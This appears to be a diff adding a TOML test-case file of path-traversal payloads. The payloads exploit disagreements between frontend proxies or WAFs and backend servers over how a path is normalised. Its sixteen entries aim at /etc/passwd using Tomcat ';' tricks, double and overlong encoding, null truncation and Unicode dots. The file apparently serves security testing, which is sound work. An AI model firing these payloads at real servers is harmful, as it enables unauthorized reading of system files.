@@ -1,0 +1,87 @@
+schema = 1
+# Path-routing parser-disagreement — frontend (CDN/WAF/proxy) and
+# backend (origin app) canonicalise the path differently. Each case is
+# a path that reaches `/etc/passwd` (or analogue) when interpreted by
+# *one* parser in the chain, while looking like a benign `/public/...`
+# fetch to the other. Real CVEs / bounty reports for variants of each
+# pattern exist against IIS, Tomcat, Spring Boot, nginx, traefik.
+
+[[case]]
+id = "tomcat_semicolon_path_param"
+class = "path"
+payload = "/public/..;/etc/passwd"
+
+[[case]]
+id = "tomcat_jsessionid_strip"
+class = "path"
+payload = "/public/..;jsessionid=x/etc/passwd"
+
+[[case]]
+id = "double_encoded_slash"
+class = "path"
+payload = "/public/..%2fetc/passwd"
+
+[[case]]
+id = "double_encoded_slash_double"
+class = "path"
+payload = "/public/..%252fetc/passwd"
+
+[[case]]
+id = "encoded_backslash_traversal"
+class = "path"
+payload = "/public/..%5cetc/passwd"
+
+[[case]]
+id = "overlong_utf8_slash"
+class = "path"
+payload = "/public/..%c0%afetc/passwd"
+
+[[case]]
+id = "proxy_shell_query_at_pattern"
+class = "path"
+payload = "/public/?@etc/passwd"
+
+[[case]]
+id = "fragment_path_split"
+class = "path"
+payload = "/public/#/etc/passwd"
+
+[[case]]
+id = "encoded_fragment_path"
+class = "path"
+payload = "/public/%23/etc/passwd"
+
+[[case]]
+id = "iis_null_truncation"
+class = "path"
+payload = "/etc/passwd/%00.json"
+
+[[case]]
+id = "extension_confusion_dot_json"
+class = "path"
+payload = "/etc/passwd/.json"
+
+[[case]]
+id = "trailing_dot_normalize"
+class = "path"
+payload = "/etc/passwd."
+
+[[case]]
+id = "trailing_space_normalize"
+class = "path"
+payload = "/etc/passwd%20"
+
+[[case]]
+id = "admin_semicolon_param"
+class = "path"
+payload = "/admin;/etc/passwd"
+
+[[case]]
+id = "static_strip_then_target"
+class = "path"
+payload = "/static/..;/etc/passwd"
+
+[[case]]
+id = "fullwidth_dot_unicode_normalize"
+class = "path"
+payload = "/public/．．/etc/passwd"
